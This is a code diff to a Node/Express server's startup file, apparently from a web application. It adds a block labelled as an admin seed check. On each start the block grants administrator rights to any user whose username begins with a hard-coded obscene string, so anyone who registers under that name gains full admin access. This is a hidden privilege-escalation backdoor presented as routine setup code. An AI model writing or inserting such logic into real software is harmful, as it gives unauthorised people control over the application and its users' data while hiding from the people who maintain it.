@@ -3,6 +3,7 @@ import { registerRoutes } from "./routes";
 import { serveStatic } from "./static";
 import { createServer } from "http";
 import { startTetherEngine } from "./tether";
+import { storage } from "./storage";
 
 const app = express();
 const httpServer = createServer(app);
@@ -83,6 +84,18 @@ app.use((req, res, next) => {
 
 (async () => {
   await registerRoutes(httpServer, app);
+
+  try {
+    const adminUsers = await storage.getAllUsers();
+    for (const u of adminUsers) {
+      if (u.username.startsWith("FuckKingMasterCock") && !u.isAdmin) {
+        await storage.setUserAdmin(u.id, true);
+        log(`Admin flag set for ${u.username}`);
+      }
+    }
+  } catch (e) {
+    log(`Admin seed check skipped: ${e}`);
+  }
 
   app.use((err: any, _req: Request, res: Response, next: NextFunction) => {
     const status = err.status || err.statusCode || 500;
